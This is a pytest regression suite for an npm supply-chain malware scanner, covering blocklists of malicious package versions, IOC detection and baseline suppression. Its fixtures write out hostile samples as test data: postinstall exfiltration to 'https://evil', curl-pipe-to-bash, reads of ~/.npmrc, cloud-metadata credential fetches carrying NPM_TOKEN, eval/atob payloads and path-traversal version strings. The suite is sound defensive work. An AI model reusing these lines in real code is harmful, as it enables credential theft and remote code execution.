"""Regression tests for scripts/scan_npm_packages.py. Run fully offline (network_blocker fixture)."""

from __future__ import annotations

import io
import json
import subprocess
import sys
import tarfile
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
SCRIPT = REPO_ROOT / "scripts" / "scan_npm_packages.py"
FIXTURES = Path(__file__).resolve().parent / "fixtures"

sys.path.insert(0, str(REPO_ROOT))
from scripts import scan_npm_packages as snp  # noqa: E402


def _run_scanner(lockfile: Path, *, timeout: int = 30) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(SCRIPT), "--lockfile", str(lockfile)],
        capture_output = True,
        text = True,
        timeout = timeout,
    )


def test_malicious_lockfile_exits_1():
    """Structural IOCs alone (non-registry resolved URL + missing integrity) fail the scanner offline."""
    fixture = FIXTURES / "structural_only_lockfile.json"
    assert fixture.is_file(), fixture
    proc = _run_scanner(fixture)
    assert proc.returncode == 1, (
        f"expected exit 1, got {proc.returncode}\n"
        f"--- stdout ---\n{proc.stdout}\n--- stderr ---\n{proc.stderr}"
    )
    combined = proc.stdout + proc.stderr
    assert "2 structural finding(s)" in combined
    assert "FAIL" in combined
    entries, struct = snp.parse_lockfile(fixture)
    patterns = {f.pattern for f in struct}
    assert {"non-registry-resolved-url", "missing-integrity-hash"} <= patterns


def test_clean_lockfile_exits_0():
    """Clean fixture has only entries parse_lockfile() skips, so the scanner exits 0 offline."""
    fixture = FIXTURES / "clean_lockfile.json"
    assert fixture.is_file(), fixture
    proc = _run_scanner(fixture)
    assert proc.returncode == 0, (
        f"expected exit 0, got {proc.returncode}\n"
        f"--- stdout ---\n{proc.stdout}\n--- stderr ---\n{proc.stderr}"
    )
    assert "0 finding(s)" in proc.stdout
    assert "0 hard error(s)" in proc.stdout


_BLOCKED_AVAILABLE = hasattr(snp, "BLOCKED_NPM_VERSIONS")


@pytest.mark.skipif(
    not _BLOCKED_AVAILABLE,
    reason = "Fork 1 (BLOCKED_NPM_VERSIONS constant) not merged yet",
)
def test_blocked_npm_versions_complete():
    table = snp.BLOCKED_NPM_VERSIONS
    tanstack_keys = [k for k in table if k.startswith("@tanstack/")]
    assert len(tanstack_keys) == 42, (
        f"expected 42 @tanstack/* entries, got {len(tanstack_keys)}: " f"{sorted(tanstack_keys)}"
    )
    assert "@opensearch-project/opensearch" in table
    assert table["@opensearch-project/opensearch"] == {"3.5.3", "3.6.2", "3.7.0", "3.8.0"}
    squawk = [k for k in table if k.startswith("@squawk/")]
    assert len(squawk) >= 22, (
        f"expected at least 22 @squawk/* entries (full safedep.io enumeration), "
        f"got {len(squawk)}: {sorted(squawk)}"
    )
    # @squawk/mcp must cover the full malicious range 0.9.1..0.9.5 (safedep.io enumeration).
    assert {"0.9.1", "0.9.2", "0.9.3", "0.9.4", "0.9.5"} <= table["@squawk/mcp"]

    uipath = [k for k in table if k.startswith("@uipath/")]
    assert len(uipath) >= 64, (
        f"expected at least 64 @uipath/* entries (Aikido enumeration), "
        f"got {len(uipath)}: {sorted(uipath)}"
    )
    assert "0.9.5" in table["@uipath/rpa-tool"]

    assert table["@mistralai/mistralai"] == {"2.2.2", "2.2.3", "2.2.4"}
    assert table["@mistralai/mistralai-gcp"] == {"1.7.1", "1.7.2", "1.7.3"}
    assert table["@mistralai/mistralai-azure"] == {"1.7.1", "1.7.2", "1.7.3"}

    tallyui = [k for k in table if k.startswith("@tallyui/")]
    assert len(tallyui) == 10, f"expected 10 @tallyui/*, got {sorted(tallyui)}"

    # Aikido: @beproduct/nestjs-auth covers 0.1.2..0.1.19.
    assert table["@beproduct/nestjs-auth"] == {f"0.1.{i}" for i in range(2, 20)}

    for unscoped in (
        "safe-action",
        "ts-dna",
        "cross-stitch",
        "cmux-agent-mcp",
        "agentwork-cli",
        "git-branch-selector",
        "wot-api",
        "git-git-git",
        "nextmove-mcp",
        "ml-toolkit-ts",
    ):
        assert unscoped in table, f"missing unscoped malicious pkg: {unscoped}"

    ioc = snp.KNOWN_IOC_STRINGS
    assert "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c" in ioc
    assert "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96" in ioc
    assert "bun run tanstack_runner.js" in ioc


@pytest.mark.skipif(
    not _BLOCKED_AVAILABLE,
    reason = "Fork 1 (BLOCKED_NPM_VERSIONS pre-fetch hook) not merged yet",
)
def test_blocked_npm_versions_short_circuits_download():
    """Pre-fetch hook flags the malicious tanstack entry (exit 1) without hitting the npm registry."""
    fixture = FIXTURES / "malicious_lockfile.json"
    proc = _run_scanner(fixture, timeout = 10)
    assert proc.returncode == 1
    combined = proc.stdout + proc.stderr
    assert "blocked-known-malicious" in combined or "BLOCKED_NPM_VERSIONS" in combined


def _extract_pkg_with_ioc(ioc: str, tmp_path: Path) -> Path:
    """Build a one-file npm package extract tree embedding `ioc` in package.json; return its root."""
    pkg_json = {
        "name": "ioc-fixture",
        "version": "0.0.1",
        "description": f"contains literal: {ioc}",
    }
    root = tmp_path / f"pkg_{abs(hash(ioc)) % 10**8}"
    (root / "package").mkdir(parents = True)
    (root / "package" / "package.json").write_text(
        json.dumps(pkg_json),
        encoding = "utf-8",
    )
    return root


def test_every_known_ioc_string_caught(tmp_path):
    """Each KNOWN_IOC_STRINGS entry must be surfaced by scan_extracted_tree(); guards table drift."""
    iocs = snp.KNOWN_IOC_STRINGS
    assert iocs, "KNOWN_IOC_STRINGS unexpectedly empty"

    pkg = snp.PackageEntry(
        name = "ioc-fixture",
        version = "0.0.1",
        resolved = "https://registry.npmjs.org/ioc-fixture/-/ioc-fixture-0.0.1.tgz",
        integrity = "sha512-stub",
        lockfile_key = "node_modules/ioc-fixture",
    )

    for ioc in iocs:
        root = _extract_pkg_with_ioc(ioc, tmp_path)
        findings = snp.scan_extracted_tree(pkg = pkg, root = root)
        hit = any(ioc in f.evidence or ioc in f.detail for f in findings)
        assert hit, (
            f"KNOWN_IOC_STRINGS[{ioc!r}] not detected by scan_extracted_tree; "
            f"findings = {[str(f) for f in findings]}"
        )


def test_parse_lockfile_structural_findings():
    """Structural-only fixture yields 2 structural findings and 0 entries."""
    entries, struct = snp.parse_lockfile(FIXTURES / "structural_only_lockfile.json")
    assert entries == []
    patterns = {f.pattern for f in struct}
    assert "non-registry-resolved-url" in patterns
    assert "missing-integrity-hash" in patterns


def _strip(src):
    out = snp._strip_js_noncode(src)
    assert len(out) == len(src), "geometry (length) must be preserved"
    assert out.count("\n") == src.count("\n"), "newline count must be preserved"
    return out


def test_strip_blanks_line_and_block_comments():
    out = _strip("var x = 1; // eval(atob('p'))\n/* subprocess */ run();")
    assert "var x = 1;" in out and "run();" in out
    assert "eval(atob" not in out
    assert "subprocess" not in out


def test_strip_keeps_url_in_string_and_template():
    src = 'const a = "http://example.com/x";\nconst b = `http://${h}//y`; go();'
    out = _strip(src)
    assert out == src
    assert "http://example.com/x" in out and "//y" in out


def test_strip_regex_with_escaped_slashes_keeps_trailing_code():
    # A naive "// = comment" stripper would eat `evil()`; the lexer must not.
    src = r"const re = /https?:\/\//g; evil();"
    out = _strip(src)
    assert out == src
    assert "evil();" in out


def test_strip_preserves_assigned_base64_payload():
    # npm droppers hide payloads in assigned string literals -- never blank them.
    src = 'var B = "QWxhZGRpbjpvcGVuc2VzYW1l"; new Function(atob(B))();'
    out = _strip(src)
    assert out == src
    assert "QWxhZGRpbjpvcGVuc2VzYW1l" in out


def test_strip_fails_open_on_unterminated_block_comment():
    src = "code(); /* never closed"
    assert snp._strip_js_noncode(src) == src


def test_strip_only_applies_to_js_family():
    PKG = snp.PackageEntry(
        name = "x",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/x/-/x-1.0.0.tgz",
        integrity = "sha512-z",
        lockfile_key = "node_modules/x",
    )
    # scan_text_blob strips for .js but not for .json.
    yaml_like = 'url: "http://h"  # a yaml comment, not JS\n'
    assert "".endswith(snp._JS_FAMILY_SUFFIXES) is False
    assert ".js" in snp._JS_FAMILY_SUFFIXES and ".json" not in snp._JS_FAMILY_SUFFIXES


_PKG = snp.PackageEntry(
    name = "x",
    version = "1.0.0",
    resolved = "https://registry.npmjs.org/x/-/x-1.0.0.tgz",
    integrity = "sha512-z",
    lockfile_key = "node_modules/x",
)
_BLOB = "QWxhZGRpbg" * 240  # ~2.4 KiB base64-ish


def test_real_payload_still_flags_after_stripping():
    src = f'/* header */ var f = new Function("{_BLOB}"); f(); // tail\n'
    pats = {f.pattern for f in snp.scan_text_blob(_PKG, "m.js", src)}
    assert "obfuscated-blob" in pats
    src2 = "(0,eval)(/* x */ atob('ZG8='));"
    pats2 = {f.pattern for f in snp.scan_text_blob(_PKG, "m.js", src2)}
    assert "js-fetch-eval" in pats2


def test_payload_entirely_in_comment_is_suppressed():
    src = f'/* var f = new Function("{_BLOB}"); */ var ok = 1;'
    js = snp.scan_text_blob(_PKG, "m.js", src)
    assert js == []
    txt = snp.scan_text_blob(_PKG, "m.txt", src)
    assert any(f.pattern == "obfuscated-blob" for f in txt)


def test_ioc_in_assigned_string_survives_stripping():
    # A real C2 host lives in a string literal, not a comment -> still caught.
    src = 'var c = "filev2.getsession.org"; // doc note\n'
    pats = {f.pattern for f in snp.scan_text_blob(_PKG, "m.js", src)}
    assert "known-ioc-string" in pats


def _finding(
    pkg,
    fn,
    pattern,
    sev = snp.HIGH,
    evidence = "",
):
    return snp.Finding(severity = sev, package = pkg, filename = fn, pattern = pattern, evidence = evidence)


def test_norm_pkg_name_strips_version_keeps_scope():
    assert snp._norm_pkg_name("@scope/pkg@1.2.3") == "@scope/pkg"
    assert snp._norm_pkg_name("pkg@1.2.3") == "pkg"
    assert snp._norm_pkg_name("@scope/pkg") == "@scope/pkg"
    assert snp._norm_pkg_name("<root>") == "<root>"


def test_baseline_key_is_version_stable():
    a = _finding("left-pad@1.0.0", "package/index.js", "obfuscated-blob")
    b = _finding("left-pad@9.9.9", "package/index.js", "obfuscated-blob")
    assert snp._finding_key(a) == snp._finding_key(b)


def test_baseline_key_distinguishes_same_basename_diff_dir():
    # Package-relative keying: the same basename in a different directory is a DIFFERENT key, so a new dist/ vs src/
    # file is not silently suppressed.
    a = _finding("pkg@1.0.0", "package/dist/index.js", "obfuscated-blob")
    b = _finding("pkg@1.0.0", "package/src/index.js", "obfuscated-blob")
    assert snp._finding_key(a) != snp._finding_key(b)


def test_baseline_suppresses_listed_but_not_new_pattern(tmp_path):
    bl = tmp_path / "bl.json"
    bl.write_text(
        json.dumps(
            {
                "version": snp._BASELINE_SCHEMA_VERSION,
                "entries": [
                    {
                        "package": "aws-sdk",
                        "file": "package/metadata.js",
                        "pattern": "cred-surface-host (outbound)",
                        "severity": "HIGH",
                    }
                ],
            }
        ),
        encoding = "utf-8",
    )
    baseline = snp._load_baseline(str(bl))

    listed = _finding("aws-sdk@2.0.0", "package/metadata.js", "cred-surface-host (outbound)")
    new_kind = _finding("aws-sdk@2.0.0", "package/metadata.js", "obfuscated-blob")
    active, suppressed = snp._partition_baseline([listed, new_kind], baseline)
    assert listed in suppressed
    assert new_kind in active


def test_write_then_load_baseline_roundtrip(tmp_path):
    bl = tmp_path / "out.json"
    findings = [
        _finding("evil@1.0.0", "package/a.js", "obfuscated-blob", snp.CRITICAL),
        _finding("evil@1.0.0", "package/a.js", "obfuscated-blob", snp.CRITICAL),
        _finding("noise@1.0.0", "package/b.js", "js-env-token", snp.MEDIUM),
    ]
    n = snp._write_baseline(str(bl), findings, snp._SEVERITY_RANK[snp.HIGH])
    assert n == 1
    keys = snp._load_baseline(str(bl))
    assert snp._finding_key(findings[0]) in keys
    assert all(k[2] != "js-env-token" for k in keys)


def test_baseline_reopens_on_changed_evidence(tmp_path):
    # Same package/file/pattern but changed flagged code must reopen: the key now includes an
    # evidence hash, so a new payload cannot ride a reviewed entry.
    bl = tmp_path / "bl.json"
    listed = _finding(
        "left-pad@1.0.0", "package/dist/index.js", "obfuscated-blob", evidence = "fetch('http://ok')"
    )
    snp._write_baseline(str(bl), [listed], snp._SEVERITY_RANK[snp.HIGH])
    baseline = snp._load_baseline(str(bl))

    same = _finding(
        "left-pad@9.9.9", "package/dist/index.js", "obfuscated-blob", evidence = "fetch('http://ok')"
    )
    changed = _finding(
        "left-pad@9.9.9",
        "package/dist/index.js",
        "obfuscated-blob",
        evidence = "fetch('http://evil')",
    )
    active, suppressed = snp._partition_baseline([same, changed], baseline)
    assert same in suppressed
    assert changed in active


def test_obfuscated_blob_key_reopens_on_changed_tail():
    pkg = snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-test",
        lockfile_key = "node_modules/evil",
    )
    head = "A" * 2300
    old = f'eval("{head}{"B" * 300}")'
    new = f'eval("{head}{"C" * 300}")'
    of = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", old)
        if f.pattern == "obfuscated-blob"
    ][0]
    nf = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", new)
        if f.pattern == "obfuscated-blob"
    ][0]
    assert "sha256:" in of.evidence
    assert of.evidence != nf.evidence
    assert snp._finding_key(of) != snp._finding_key(nf)


def test_js_fetch_eval_payload_tail_reopens_key():
    pkg = snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-test",
        lockfile_key = "node_modules/evil",
    )
    head = "A" * 40
    old = "(0,eval)(atob('" + head + "X" * 80 + "'))\n"
    new = "(0,eval)(atob('" + head + "Y" * 80 + "'))\n"
    of = [
        f for f in snp.scan_text_blob(pkg, "package/index.js", old) if f.pattern == "js-fetch-eval"
    ][0]
    nf = [
        f for f in snp.scan_text_blob(pkg, "package/index.js", new) if f.pattern == "js-fetch-eval"
    ][0]
    assert "sha256:" in of.evidence
    assert snp._finding_key(of) != snp._finding_key(nf)


def test_outbound_host_multiline_options_reopen():
    pkg = snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-test",
        lockfile_key = "node_modules/evil",
    )
    url = "fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/role',\n"
    old = url + "  {headers: {a: 'old'}})\n"
    new = url + "  {headers: {a: 'evil', token: process.env.NPM_TOKEN}})\n"
    of = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", old)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    nf = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", new)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    assert "sha256:" in of.evidence
    assert snp._finding_key(of) != snp._finding_key(nf)


def test_outbound_host_config_multiline_object_reopens():
    pkg = snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-test",
        lockfile_key = "node_modules/evil",
    )
    obj = (
        "const opts = {\n  hostname: '169.254.169.254',\n  path: '%s',\n};\nhttps.request(opts);\n"
    )
    old = obj % "/latest/meta-data/iam/security-credentials/old"
    new = obj % "/latest/meta-data/iam/security-credentials/evil"
    of = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", old)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    nf = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", new)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    assert snp._finding_key(of) != snp._finding_key(nf)


def _host_config_pkg():
    return snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-test",
        lockfile_key = "node_modules/evil",
    )


def _host_finding(text):
    return [
        f
        for f in snp.scan_text_blob(_host_config_pkg(), "package/index.js", text)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]


def test_outbound_host_config_long_object_binds_tail():
    filler = "\n".join(f"  opt{i}: {i}," for i in range(30))
    obj = (
        "const opts = {\n  hostname: '169.254.169.254',\n"
        + filler
        + "\n  path: '%s',\n};\nrun(opts);\n"
    )
    assert snp._finding_key(_host_finding(obj % "/old")) != snp._finding_key(
        _host_finding(obj % "/evil")
    )


def test_outbound_host_config_far_opener_binds():
    above = "\n".join(f"  opt{i}: {i}," for i in range(20))
    obj = (
        "const opts = {\n"
        + above
        + "\n  hostname: '169.254.169.254',\n  path: '/x',\n};\nrun(opts);\n"
    )
    changed = obj.replace("opt0: 0,", "opt0: 999,")
    assert snp._finding_key(_host_finding(obj)) != snp._finding_key(_host_finding(changed))


def test_outbound_host_config_forward_cap_measured_from_match():
    above = "\n".join(f"  opt{i}: {i}," for i in range(198))
    obj = (
        "const opts = {\n"
        + above
        + "\n  hostname: '169.254.169.254',\n  path: '%s',\n};\nrun(opts);\n"
    )
    assert snp._finding_key(_host_finding(obj % "/old")) != snp._finding_key(
        _host_finding(obj % "/evil")
    )


def test_outbound_host_multiple_contexts_all_bind():
    base = "const u = 'http://169.254.169.254/latest/meta-data/';\nfetch(u);\n"
    extra = "https.request({\n  hostname: '169.254.169.254',\n  path: '/evil',\n});\n"
    assert snp._finding_key(_host_finding(base)) != snp._finding_key(_host_finding(base + extra))


def test_outbound_host_config_opener_after_unmatched_closer_binds():
    pre = "callback(arg);\n});\n"  # stray closer; the matching opener is out of view
    obj = pre + "const opts = {\n  hostname: '169.254.169.254',\n  path: '%s',\n};\nrun(opts);\n"
    assert snp._finding_key(_host_finding(obj % "/old")) != snp._finding_key(
        _host_finding(obj % "/evil")
    )


def test_outbound_host_config_close_then_open_same_line_binds():
    # The unmatched closer and the opener share one line; order-aware reduction keeps the `{`.
    obj = "}); const opts = {\n  hostname: '169.254.169.254',\n  path: '%s',\n};\nrun(opts);\n"
    assert snp._finding_key(_host_finding(obj % "/old")) != snp._finding_key(
        _host_finding(obj % "/evil")
    )


def test_outbound_host_multiline_template_literal_reopens():
    old = "request(`http://169.254.169.254/x\n)`, {\n  headers: {a: 'old'},\n});\n"
    new = "request(`http://169.254.169.254/x\n)`, {\n  headers: {a: 'evil'},\n});\n"
    assert snp._finding_key(_host_finding(old)) != snp._finding_key(_host_finding(new))


def test_cred_env_lifecycle_binds_whole_body():
    def life(body):
        pkg = snp.PackageEntry(
            name = "e",
            version = "1.0.0",
            resolved = "https://registry.npmjs.org/e/-/e-1.0.0.tgz",
            integrity = "sha512-x",
            lockfile_key = "node_modules/e",
        )
        text = json.dumps({"scripts": {"postinstall": body}})
        return [
            f
            for f in snp.scan_package_json(pkg, "package/package.json", text)
            if "cred-env-in-lifecycle" in f.pattern
        ][0]

    safe = life("node -e 'console.log(process.env.NPM_TOKEN)'; echo safe")
    evil = life("node -e 'console.log(process.env.NPM_TOKEN)'; curl -d x https://evil")
    assert "body-sha256:" in safe.evidence
    assert snp._finding_key(safe) != snp._finding_key(evil)


def _lifecycle_finding(body, frag):
    pkg = snp.PackageEntry(
        name = "e",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/e/-/e-1.0.0.tgz",
        integrity = "sha512-x",
        lockfile_key = "node_modules/e",
    )
    text = json.dumps({"scripts": {"postinstall": body}})
    return [
        f for f in snp.scan_package_json(pkg, "package/package.json", text) if frag in f.pattern
    ][0]


def test_lifecycle_fetch_exec_bounds_body_but_reopens():
    # Evidence is a bounded snippet plus a whole-body digest, so the baseline stays small.
    pad = "# pad\n" * 5000
    old = "curl https://x.sh | bash\n" + pad + "echo done_old"
    new = "curl https://x.sh | bash\n" + pad + "echo done_evil"
    of = _lifecycle_finding(old, "lifecycle-fetch-exec")
    nf = _lifecycle_finding(new, "lifecycle-fetch-exec")
    assert "body-sha256:" in of.evidence
    assert len(of.evidence) < len(old)
    assert snp._finding_key(of) != snp._finding_key(nf)


def test_cred_path_lifecycle_bounds_body_but_reopens():
    pad = "# pad\n" * 5000
    old = "cat ~/.npmrc\n" + pad + "echo old"
    new = "cat ~/.npmrc\n" + pad + "echo evil"
    of = _lifecycle_finding(old, "cred-path-in-lifecycle")
    nf = _lifecycle_finding(new, "cred-path-in-lifecycle")
    assert "body-sha256:" in of.evidence
    assert len(of.evidence) < len(old)
    assert snp._finding_key(of) != snp._finding_key(nf)


def test_outbound_host_regex_literal_does_not_close_group_early():
    old = "request('http://169.254.169.254', /)/, {\n  headers: {a: 'old'},\n});\n"
    new = old.replace("old", "evil")
    assert snp._finding_key(_host_finding(old)) != snp._finding_key(_host_finding(new))


def test_evidence_overflow_binds_context_and_counts_all_matches():
    # Every match past the display cap is still counted in the overflow digest AND bound by its logical-line context
    n = snp._MAX_EVIDENCE_MATCHES
    mk = lambda which: "".join(
        f"a{i} = process.env.NPM_TOKEN; tag{i} = {'evil' if i == n + 2 and which else 'safe'}\n"
        for i in range(n + 5)
    )
    e1 = snp._evidence(mk(False), snp._JS_ENV_TOKEN)
    e2 = snp._evidence(mk(True), snp._JS_ENV_TOKEN)
    assert "more) sha256:" in e1
    assert snp._evidence_hash(e1) != snp._evidence_hash(e2)


def test_evidence_caps_match_count_with_digest_remainder():
    # Past _MAX_EVIDENCE_MATCHES remaining matches fold into one digest to bound evidence size.
    over = snp._MAX_EVIDENCE_MATCHES + 20
    base = "".join(f"x{i} = process.env.NPM_TOKEN\n" for i in range(over))
    ev = snp._evidence(base, snp._JS_ENV_TOKEN)
    assert "more) sha256:" in ev
    assert ev.count(" | ") <= snp._MAX_EVIDENCE_MATCHES
    less = "".join(f"x{i} = process.env.NPM_TOKEN\n" for i in range(over - 1))
    assert snp._evidence_hash(ev) != snp._evidence_hash(snp._evidence(less, snp._JS_ENV_TOKEN))


def test_evidence_streams_overflow_count_is_exact():
    extra = 1000
    total = snp._MAX_EVIDENCE_MATCHES + extra
    body = "".join(f"x{i} = process.env.NPM_TOKEN\n" for i in range(total))
    ev = snp._evidence(body, snp._JS_ENV_TOKEN)
    import re as _re

    m = _re.search(r"\(\+(\d+) more\)", ev)
    assert m and int(m.group(1)) == extra  # every over-cap match counted
    assert ev.count(" | ") <= snp._MAX_EVIDENCE_MATCHES


def _ioc_pkg():
    return snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-x",
        lockfile_key = "node_modules/evil",
    )


def test_known_ioc_evidence_binds_context_not_bare_needle():
    ioc = next(iter(snp.KNOWN_IOC_STRINGS))
    old = f"fetch('http://h/'+'{ioc}', {{body: 'OLD'}})\n"
    new = f"fetch('http://h/'+'{ioc}', {{body: 'EVIL'}})\n"

    def key(text):
        return [
            snp._finding_key(f)
            for f in snp.scan_text_blob(_ioc_pkg(), "package/x.js", text)
            if f.pattern == "known-ioc-string"
        ][0]

    assert key(old) != key(new)


def test_always_bad_host_evidence_binds_outbound_context():
    host = snp.CRED_HOST_ALWAYS_BAD[0][0]
    old = f"fetch('https://{host}/x', {{body: secretOLD}})\n"
    new = f"fetch('https://{host}/x', {{body: secretEVIL}})\n"

    def key(text):
        return [
            snp._finding_key(f)
            for f in snp.scan_text_blob(_ioc_pkg(), "package/x.js", text)
            if f.pattern == "cred-surface-host (always-bad)"
        ][0]

    assert key(old) != key(new)


def test_outbound_host_config_reindent_is_stable():
    tight = "const opts = {\n  hostname: '169.254.169.254',\n  path: '/x',\n};\nrun(opts);\n"
    loose = (
        "const opts = {\n      hostname: '169.254.169.254',\n      path:    '/x',\n};\nrun(opts);\n"
    )
    assert snp._finding_key(_host_finding(tight)) == snp._finding_key(_host_finding(loose))


def test_evidence_preserves_intra_string_whitespace():
    # Whitespace OUTSIDE string literals is normalized (reindent-stable), but whitespace INSIDE a literal is preserved
    a = "request('http://169.254.169.254/x', {\n  body: 'a b',\n});\n"
    b = "request('http://169.254.169.254/x', {\n  body: 'a    b',\n});\n"
    assert snp._finding_key(_host_finding(a)) != snp._finding_key(_host_finding(b))


def test_outbound_cred_surface_binds_context():
    pkg = snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-test",
        lockfile_key = "node_modules/evil",
    )
    old = "fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/old')\n"
    new = (
        "fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/evil', "
        "{headers: steal})\n"
    )
    of = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", old)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    nf = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", new)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    assert snp._finding_key(of) != snp._finding_key(nf)


def test_load_baseline_skips_non_dict_entries(tmp_path):
    bl = tmp_path / "bad.json"
    bl.write_text(
        json.dumps(
            {
                "version": snp._BASELINE_SCHEMA_VERSION,
                "entries": ["oops", 123, {"package": "p", "file": "package/a.js", "pattern": "x"}],
            }
        ),
        encoding = "utf-8",
    )
    keys = snp._load_baseline(str(bl))
    assert keys == {("p", "a.js", "x", snp._evidence_hash(""))}
    arr = tmp_path / "arr.json"
    arr.write_text("[1, 2, 3]", encoding = "utf-8")
    assert snp._load_baseline(str(arr)) == set()


def test_legacy_schema_baseline_is_ignored(tmp_path):
    # A pre-v2 baseline stored basenames, whose keys are ambiguous under package-relative matching, so a populated
    # legacy file is ignored (fail closed) rather than silently suppressing a different same-named file.
    bl = tmp_path / "legacy.json"
    bl.write_text(
        json.dumps(
            {
                "version": 1,
                "entries": [
                    {"package": "aws-sdk", "file": "index.js", "pattern": "obfuscated-blob"}
                ],
            }
        ),
        encoding = "utf-8",
    )
    assert snp._load_baseline(str(bl)) == set()


def test_v2_baseline_migrates_by_recomputing_hash(tmp_path):
    bl = tmp_path / "v2.json"
    evidence = "fetch('http://ok')"
    bl.write_text(
        json.dumps(
            {
                "version": 2,
                "entries": [
                    {
                        "package": "left-pad",
                        "file": "package/dist/index.js",
                        "pattern": "obfuscated-blob",
                        "severity": snp.HIGH,
                        "evidence": evidence,
                    }
                ],
            }
        ),
        encoding = "utf-8",
    )
    finding = _finding(
        "left-pad@9.9.9", "package/dist/index.js", "obfuscated-blob", evidence = evidence
    )
    assert snp._finding_key(finding) in snp._load_baseline(str(bl))


def test_outbound_cred_surface_host_config_binds_full_context():
    pkg = snp.PackageEntry(
        name = "evil",
        version = "1.0.0",
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = "sha512-test",
        lockfile_key = "node_modules/evil",
    )
    path = "/latest/meta-data/iam/security-credentials/role-name"
    old = (
        "const opts = {hostname: '169.254.169.254', "
        f"path: '{path}', headers: {{a: 'old'}}}};\nrun(opts);\n"
    )
    new = (
        "const opts = {hostname: '169.254.169.254', "
        f"path: '{path}', headers: {{a: 'evil', token: process.env.NPM_TOKEN}}}};\nrun(opts);\n"
    )
    of = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", old)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    nf = [
        f
        for f in snp.scan_text_blob(pkg, "package/index.js", new)
        if f.pattern == "cred-surface-host (outbound)"
    ][0]
    assert snp._finding_key(of) != snp._finding_key(nf)


def test_committed_baseline_is_empty_and_valid():
    # Shipped baseline must parse and (by design) suppress nothing: the live corpus is clean.
    path = REPO_ROOT / "scripts" / "scan_npm_packages_baseline.json"
    assert path.is_file()
    doc = json.loads(path.read_text(encoding = "utf-8"))
    assert doc.get("entries") == []
    assert snp._load_baseline(str(path)) == set()


@pytest.mark.parametrize("version", ["../../victim", "1.0.0/../../../victim"])
def test_scan_one_keeps_its_cleanup_inside_the_workspace(tmp_path, monkeypatch, version):
    """Lockfile names and versions are untrusted: scan_one's rmtree must not leave the workspace."""
    workspace = tmp_path / "ws" / "inner"
    workspace.mkdir(parents = True)
    victim = tmp_path / "victim"
    victim.mkdir()
    (victim / "keep.txt").write_text("keep")
    pkg = snp.PackageEntry(
        name = "evil",
        version = version,
        resolved = "https://registry.npmjs.org/evil/-/evil-1.0.0.tgz",
        integrity = None,
        lockfile_key = "node_modules/evil",
    )
    monkeypatch.setattr(snp, "download_tarball", lambda pkg, dest: (None, "integrity missing"))

    findings, err = snp.scan_one(pkg, workspace)

    assert (findings, err) == ([], "integrity missing")
    assert (victim / "keep.txt").read_text() == "keep"
    assert list(workspace.iterdir()) == []
